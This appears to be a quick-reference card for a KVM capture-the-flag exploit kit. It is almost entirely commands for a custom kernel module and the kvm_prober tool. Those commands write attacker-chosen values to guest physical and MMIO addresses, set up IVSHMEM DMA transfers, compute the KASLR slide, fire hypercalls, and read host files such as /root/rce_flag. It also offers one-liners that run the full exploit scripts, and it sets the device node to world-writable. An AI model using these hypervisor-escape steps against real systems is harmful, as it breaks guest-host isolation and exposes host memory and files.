# KVM CTF Exploit - Quick Reference Card

## 🎯 Target Flags

| Flag | Physical Addr | Virtual Addr | Value/Action | Points |
|------|---------------|--------------|--------------|--------|
| Write | `0x64279a8` | `0xffffffff826279a8` | `0xdeadbeef41424344` | 250k |
| Read | `0x695ee10` | `0xffffffff82b5ee10` | Read content | 50-100k |
| RCE | N/A | N/A | Read `/root/rce_flag` | 250k |

## 🚀 Quick Start (3 Commands)

```bash
# 1. Setup everything
sudo ./setup.sh install

# 2. Check for IVSHMEM devices  
sudo ./setup.sh info

# 3. Run all exploits
sudo ./setup.sh exploit all
```

## 📋 Setup Commands

```bash
# Full installation
sudo ./setup.sh install

# Just build (no install)
sudo ./setup.sh build

# Load module only
sudo ./setup.sh load

# Run basic tests
sudo ./setup.sh test

# Show PCI/IVSHMEM info
sudo ./setup.sh info

# Clean everything
sudo ./setup.sh clean
```

## 🎯 Exploit Commands

```bash
# Run all exploit methods (RECOMMENDED)
sudo ./setup.sh exploit all

# Run specific exploits
sudo ./setup.sh exploit hybrid    # IVSHMEM + Direct (best)
sudo ./setup.sh exploit ivshmem   # IVSHMEM-focused
sudo ./setup.sh exploit direct    # Direct access only
sudo ./setup.sh exploit c         # C implementation

# Or run Python directly
sudo python3 hybrid_kvm_exploit.py
sudo python3 ivshmem_kvm_exploit.py
sudo python3 comprehensive_kvm_exploit.py
```

## 🔧 Manual kvm_prober Commands

### Memory Operations
```bash
# Write to GPA (Guest Physical Address)
kvm_prober writegpa 64279a8 4443424241efbeadde

# Read from GPA
kvm_prober readgpa 64279a8 8

# Write to MMIO
kvm_prober writemmio_val fe800000 deadbeef 8

# Read from MMIO
kvm_prober readmmio_buf fe800000 64
```

### File Operations
```bash
# Read host file (RCE)
kvm_prober readfile /root/rce_flag 0 256

# Read any host file
kvm_prober readfile /etc/hostname 0 100
```

### Address Translation
```bash
# Virtual to Physical
kvm_prober virt2phys ffffffff826279a8

# Physical to Virtual  
kvm_prober phys2virt 64279a8

# Get KASLR slide
kvm_prober getkaslr
```

### Hypercalls
```bash
# Trigger basic hypercall
kvm_prober trigger_hypercall

# Custom hypercall (nr, arg0, arg1, arg2, arg3)
kvm_prober hypercall 100 64279a8 deadbeef41424344 0 0
```

### Scanning
```bash
# Scan MMIO region
kvm_prober scanmmio fe800000 fe900000 1000

# Scan virtual addresses
kvm_prober scanva ffffffff81000000 ffffffff82000000 1000
```

## 🔍 Reconnaissance Commands

### Check PCI Devices
```bash
# List all PCI devices
lspci -v

# Find IVSHMEM devices (vendor 1af4)
lspci -d 1af4:

# Show device details
lspci -vvv -s 0000:00:12.0
```

### Check BARs (Base Address Registers)
```bash
# View BARs for a device
cat /sys/bus/pci/devices/0000:00:12.0/resource

# Find all non-zero BARs
for dev in /sys/bus/pci/devices/*/resource; do
  echo "=== $(basename $(dirname $dev)) ==="
  grep -v "0x0000000000000000" $dev | head -3
done
```

### Memory Map
```bash
# View IOMEM regions
cat /proc/iomem | grep -i "virtio\|pci"

# Check for specific addresses
cat /proc/iomem | grep -E "fe[0-9a-f]{6}"
```

## 🐛 Debugging Commands

### Module Status
```bash
# Check if loaded
lsmod | grep kvm_probe

# View kernel messages
dmesg | grep kvm_probe

# Watch live kernel messages
dmesg -w
```

### Device Status
```bash
# Check device exists
ls -la /dev/kvm_probe*

# Check device permissions
stat /dev/kvm_probe_dev

# Fix permissions if needed
sudo chmod 666 /dev/kvm_probe_dev
```

### Troubleshooting
```bash
# Reload module
sudo rmmod kvm_probe_drv
sudo insmod kvm_probe_drv.ko

# Check for errors
dmesg | tail -20

# Verify module loaded correctly
sudo modinfo kvm_probe_drv.ko
```

## 🎲 Attack Strategies

### Strategy 1: Direct GPA Attack (Simplest)
```bash
# Write flag directly
kvm_prober writegpa 64279a8 4443424241efbeadde

# Verify
kvm_prober readgpa 64279a8 8
```

### Strategy 2: IVSHMEM BAR Attack
```bash
# 1. Find IVSHMEM device
lspci -d 1af4:

# 2. Check BARs
cat /sys/bus/pci/devices/0000:00:04.0/resource

# 3. Calculate offset and write
# If BAR at 0xfe800000, and target at 0x64279a8:
# Try: BAR_BASE + (TARGET & 0xFFFFFF)
kvm_prober writemmio_val fe4279a8 deadbeef41424344 8
```

### Strategy 3: IVSHMEM DMA Attack
```bash
# 1. Find large prefetchable BAR (IVSHMEM)
# 2. Write value to buffer in BAR
kvm_prober writemmio_val fe801000 deadbeef41424344 8

# 3. Configure DMA (example registers)
kvm_prober writemmio_val fe800008 fe801000 8  # Source
kvm_prober writemmio_val fe800010 64279a8 8   # Dest
kvm_prober writemmio_val fe800018 8 4         # Length
kvm_prober writemmio_val fe800020 1 4         # Trigger
```

### Strategy 4: File Read (RCE)
```bash
# Read RCE flag
kvm_prober readfile /root/rce_flag 0 256

# Try Python for better parsing
python3 -c "
from hybrid_kvm_exploit import *
e = HybridExploit()
e.exploit_rce_file()
"
```

## 📊 Expected Success Patterns

### Successful Write Flag
```
[✓✓✓] WRITE FLAG CAPTURED! Value verified: 0xdeadbeef41424344
```

### Successful Read Flag
```
[✓✓✓] READ FLAG FOUND: flag{...}
```

### Successful RCE
```
[✓✓✓] RCE FLAG CAPTURED: flag{...}
```

## 🔑 Key Memory Addresses (with KASLR)

### Without KASLR (base = 0xffffffff81000000)
- Write Flag: `0xffffffff826279a8` (phys: `0x64279a8`)
- Read Flag: `0xffffffff82b5ee10` (phys: `0x695ee10`)

### With KASLR (add slide to virtual addresses)
```bash
# Get slide
SLIDE=$(kvm_prober getkaslr | grep "slide:" | awk '{print $4}')

# Calculate adjusted addresses
WRITE_VIRT=$((0xffffffff826279a8 + $SLIDE))
READ_VIRT=$((0xffffffff82b5ee10 + $SLIDE))
```

## 🏆 Scoring Quick Check

After running exploits, verify captures:

```bash
# Check write flag (should show 0xdeadbeef41424344)
kvm_prober readgpa 64279a8 8

# Check read flag (look for flag pattern)
kvm_prober readgpa 695ee10 64

# Check RCE flag
kvm_prober readfile /root/rce_flag 0 256

# Or use Python to check all
python3 -c "
from hybrid_kvm_exploit import *
e = HybridExploit()
if e.gpa_read(0x64279a8, 8) == b'\x44\x43\x42\x41\xef\xbe\xad\xde':
    print('[✓] Write flag verified!')
print('[+] Read flag:', e.gpa_read(0x695ee10, 64))
e.exploit_rce_file()
"
```

## 📝 Common Issues & Fixes

### Issue: "Device not found"
```bash
# Check module loaded
lsmod | grep kvm_probe

# Reload if needed
sudo rmmod kvm_probe_drv
sudo insmod kvm_probe_drv.ko

# Check device
ls -la /dev/kvm_probe*
```

### Issue: "Permission denied"
```bash
# Must be root
sudo su

# Or fix permissions
sudo chmod 666 /dev/kvm_probe_dev
```

### Issue: "IOCTL failed"
```bash
# Check kernel messages
dmesg | tail -10

# Verify IOCTL number is correct
# Try basic test
kvm_prober trigger_hypercall
```

### Issue: "No IVSHMEM devices"
```bash
# List all PCI devices
lspci -v

# Look for virtio devices (may work similarly)
lspci | grep -i virtio

# Try direct GPA access instead
kvm_prober writegpa 64279a8 4443424241efbeadde
```

## 🎯 One-Liner Exploits

```bash
# Quick write flag
sudo kvm_prober writegpa 64279a8 4443424241efbeadde && sudo kvm_prober readgpa 64279a8 8

# Quick read flag
sudo kvm_prober readgpa 695ee10 64

# Quick RCE
sudo kvm_prober readfile /root/rce_flag 0 256

# All in one (Python)
sudo python3 -c "from hybrid_kvm_exploit import *; HybridExploit().run_all_exploits()"
```

## 📚 File Reference

| File | Purpose |
|------|---------|
| `kvm_probe_drv.c` | Kernel module source |
| `kvm_prober.c` | Userspace CLI tool |
| `hybrid_kvm_exploit.py` | **Main exploit** (IVSHMEM + Direct) |
| `ivshmem_kvm_exploit.py` | IVSHMEM-focused |
| `comprehensive_kvm_exploit.py` | Direct access only |
| `kvm_direct_exploit.c` | C implementation |
| `setup.sh` | Installation script |
| `Makefile` | Build automation |

## 🚨 Emergency Reset

If everything breaks:
```bash
# Full cleanup
sudo rmmod kvm_probe_drv 2>/dev/null || true
make clean
rm -f /dev/kvm_probe*

# Rebuild from scratch
make clean
make all
sudo insmod kvm_probe_drv.ko

# Verify
ls -la /dev/kvm_probe*
sudo kvm_prober getkaslr
```

---

**Remember**: The hybrid exploit (`hybrid_kvm_exploit.py`) tries all methods automatically. Start there!